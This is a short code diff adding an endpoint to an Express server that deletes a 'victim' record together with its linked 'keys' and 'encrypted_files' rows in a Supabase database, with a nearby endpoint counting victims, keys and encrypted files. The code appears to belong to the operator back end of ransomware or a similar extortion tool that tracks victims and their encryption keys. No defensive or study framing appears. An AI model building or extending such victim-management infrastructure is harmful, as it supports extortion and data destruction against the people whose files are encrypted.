@@ -609,6 +609,35 @@ app.post('/api/db/keys/delete', async (req, res) => {
   }
 });
 
+// Delete victim from database (cascades to keys and encrypted_files)
+app.post('/api/db/victims/delete', async (req, res) => {
+  if (!supabase) {
+    return res.status(500).json({ success: false, message: 'Supabase not configured' });
+  }
+  try {
+    const { uuid } = req.body;
+    if (!uuid) {
+      return res.status(400).json({ success: false, message: 'UUID required' });
+    }
+
+    // Delete in order: encrypted_files -> keys -> victims (respecting FK constraints)
+    await supabase.from('encrypted_files').delete().eq('uuid', uuid);
+    await supabase.from('keys').delete().eq('uuid', uuid);
+
+    const { error } = await supabase
+      .from('victims')
+      .delete()
+      .eq('uuid', uuid);
+
+    if (error) throw error;
+
+    logServer(`Víctima eliminada de DB: ${uuid}`);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ success: false, message: e.message });
+  }
+});
+
 app.get('/api/db/stats', async (req, res) => {
   if (!supabase) {
     return res.json({ success: false, victims: 0, keys: 0, encrypted: 0 });
